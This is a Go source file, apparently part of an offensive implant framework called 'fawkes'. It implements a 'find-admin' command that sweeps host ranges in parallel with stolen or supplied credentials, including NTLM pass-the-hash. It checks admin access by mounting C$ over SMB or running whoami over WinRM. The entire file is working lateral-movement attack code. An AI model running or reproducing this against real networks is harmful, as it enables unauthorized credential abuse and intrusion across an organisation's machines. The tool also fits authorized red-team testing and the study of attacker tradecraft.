package commands

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
	"github.com/masterzen/winrm"
)

type FindAdminCommand struct{}

func (c *FindAdminCommand) Name() string { return "find-admin" }
func (c *FindAdminCommand) Description() string {
	return "Sweep hosts to discover where credentials have admin access via SMB/WinRM (T1021.002, T1021.006)"
}

type findAdminArgs struct {
	Hosts       string `json:"hosts"`       // target hosts (IPs, CIDR, ranges, hostnames)
	Username    string `json:"username"`    // username (DOMAIN\user or user@domain)
	Password    string `json:"password"`    // password
	Hash        string `json:"hash"`        // NTLM hash for PTH
	Domain      string `json:"domain"`      // explicit domain
	Method      string `json:"method"`      // smb, winrm, both (default: smb)
	Timeout     int    `json:"timeout"`     // per-host timeout in seconds
	Concurrency int    `json:"concurrency"` // max parallel checks
}

type findAdminResult struct {
	Host    string
	Method  string
	Admin   bool
	Message string
}

func (c *FindAdminCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -hosts <targets> -username <user> -password <pass>",
			Status:    "error",
			Completed: true,
		}
	}

	var args findAdminArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Hosts == "" {
		return structs.CommandResult{
			Output:    "Error: hosts parameter is required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Username == "" || (args.Password == "" && args.Hash == "") {
		return structs.CommandResult{
			Output:    "Error: username and password (or hash) are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Timeout <= 0 {
		args.Timeout = 5
	}
	if args.Concurrency <= 0 {
		args.Concurrency = 50
	}
	if args.Method == "" {
		args.Method = "smb"
	}
	args.Method = strings.ToLower(args.Method)

	// Parse domain from username
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	// Parse host list (reuses parseHosts from port_scan.go)
	hosts, err := parseHosts(args.Hosts)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing hosts: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(hosts) == 0 {
		return structs.CommandResult{
			Output:    "Error: no valid hosts found",
			Status:    "error",
			Completed: true,
		}
	}

	credDisplay := args.Username
	if args.Domain != "" {
		credDisplay = args.Domain + `\` + args.Username
	}
	authType := "password"
	if args.Hash != "" {
		authType = "PTH"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Admin access sweep: %d hosts via %s (%s as %s)\n", len(hosts), args.Method, authType, credDisplay))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	// Run parallel checks
	var results []findAdminResult
	var mu sync.Mutex
	sem := make(chan struct{}, args.Concurrency)
	var wg sync.WaitGroup

	for _, host := range hosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()

			var hostResults []findAdminResult

			switch args.Method {
			case "smb":
				hostResults = append(hostResults, findAdminCheckSMB(h, args))
			case "winrm":
				hostResults = append(hostResults, findAdminCheckWinRM(h, args))
			case "both":
				hostResults = append(hostResults, findAdminCheckSMB(h, args))
				hostResults = append(hostResults, findAdminCheckWinRM(h, args))
			default:
				hostResults = append(hostResults, findAdminCheckSMB(h, args))
			}

			mu.Lock()
			results = append(results, hostResults...)
			mu.Unlock()
		}(host)
	}

	wg.Wait()

	// Sort results: admin hosts first, then by host
	sort.Slice(results, func(i, j int) bool {
		if results[i].Admin != results[j].Admin {
			return results[i].Admin
		}
		return results[i].Host < results[j].Host
	})

	adminCount := 0
	for _, r := range results {
		if r.Admin {
			adminCount++
			sb.WriteString(fmt.Sprintf("[+] %-20s %-6s ADMIN\n", r.Host, r.Method))
		} else {
			sb.WriteString(fmt.Sprintf("[-] %-20s %-6s %s\n", r.Host, r.Method, r.Message))
		}
	}

	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(fmt.Sprintf("[*] %d/%d hosts have admin access\n", adminCount, len(hosts)))

	status := "success"
	if adminCount == 0 && len(hosts) > 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

// findAdminCheckSMB tests admin access by connecting to the C$ admin share.
func findAdminCheckSMB(host string, args findAdminArgs) findAdminResult {
	timeout := time.Duration(args.Timeout) * time.Second

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", host), timeout)
	if err != nil {
		return findAdminResult{Host: host, Method: "SMB", Admin: false, Message: "unreachable"}
	}

	initiator := &smb2.NTLMInitiator{
		User:   args.Username,
		Domain: args.Domain,
	}

	if args.Hash != "" {
		hashBytes, err := findAdminDecodeHash(args.Hash)
		if err != nil {
			_ = conn.Close()
			return findAdminResult{Host: host, Method: "SMB", Admin: false, Message: "bad hash"}
		}
		initiator.Hash = hashBytes
	} else {
		initiator.Password = args.Password
	}

	d := &smb2.Dialer{Initiator: initiator}

	_ = conn.SetDeadline(time.Now().Add(timeout))
	session, err := d.Dial(conn)
	if err != nil {
		_ = conn.Close()
		errStr := err.Error()
		if strings.Contains(errStr, "LOGON_FAILURE") || strings.Contains(errStr, "STATUS_LOGON_FAILURE") {
			return findAdminResult{Host: host, Method: "SMB", Admin: false, Message: "auth failed"}
		}
		return findAdminResult{Host: host, Method: "SMB", Admin: false, Message: "auth error"}
	}
	defer func() {
		_ = session.Logoff()
		_ = conn.Close()
	}()

	// Try mounting C$ — only admins can access admin shares
	_ = conn.SetDeadline(time.Now().Add(timeout))
	share, err := session.Mount(`\\` + host + `\C$`)
	if err != nil {
		_ = conn.SetDeadline(time.Time{})
		errStr := err.Error()
		if strings.Contains(errStr, "ACCESS_DENIED") || strings.Contains(errStr, "STATUS_ACCESS_DENIED") {
			return findAdminResult{Host: host, Method: "SMB", Admin: false, Message: "access denied"}
		}
		return findAdminResult{Host: host, Method: "SMB", Admin: false, Message: "no admin share"}
	}
	_ = share.Umount()

	return findAdminResult{Host: host, Method: "SMB", Admin: true}
}

// findAdminCheckWinRM tests admin access by executing whoami on the target.
func findAdminCheckWinRM(host string, args findAdminArgs) findAdminResult {
	timeout := time.Duration(args.Timeout) * time.Second

	// Quick port check first to avoid slow WinRM timeouts on unreachable hosts
	portConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:5985", host), timeout)
	if err != nil {
		return findAdminResult{Host: host, Method: "WinRM", Admin: false, Message: "unreachable"}
	}
	_ = portConn.Close()

	endpoint := winrm.NewEndpoint(
		host,
		5985,
		false, // no TLS
		true,  // insecure
		nil, nil, nil,
		timeout,
	)

	authCred := args.Password
	useHash := args.Hash != ""
	if useHash {
		authCred = args.Hash
	}

	params := winrm.DefaultParameters
	if useHash {
		params.TransportDecorator = func() winrm.Transporter {
			return &winrmHashTransport{
				username: args.Username,
				hash:     args.Hash,
				insecure: true,
				useTLS:   false,
				timeout:  timeout,
			}
		}
	} else {
		params.TransportDecorator = func() winrm.Transporter {
			return &winrm.ClientNTLM{}
		}
	}

	client, err := winrm.NewClientWithParameters(endpoint, args.Username, authCred, params)
	if err != nil {
		return findAdminResult{Host: host, Method: "WinRM", Admin: false, Message: "client error"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	_, _, _, err = client.RunWithContextWithString(ctx, "whoami", "")
	if err != nil {
		errStr := err.Error()
		if strings.Contains(errStr, "401") || strings.Contains(errStr, "Unauthorized") {
			return findAdminResult{Host: host, Method: "WinRM", Admin: false, Message: "auth failed"}
		}
		return findAdminResult{Host: host, Method: "WinRM", Admin: false, Message: "access denied"}
	}

	return findAdminResult{Host: host, Method: "WinRM", Admin: true}
}

// findAdminDecodeHash decodes an NTLM hash (same logic as smbDecodeHash but avoids cross-file coupling).
func findAdminDecodeHash(hashStr string) ([]byte, error) {
	hashStr = strings.TrimSpace(hashStr)
	if parts := strings.SplitN(hashStr, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
		hashStr = parts[1]
	}
	hashBytes, err := hex.DecodeString(hashStr)
	if err != nil {
		return nil, fmt.Errorf("hash must be hex-encoded: %v", err)
	}
	if len(hashBytes) != 16 {
		return nil, fmt.Errorf("NT hash must be 16 bytes, got %d", len(hashBytes))
	}
	return hashBytes, nil
}
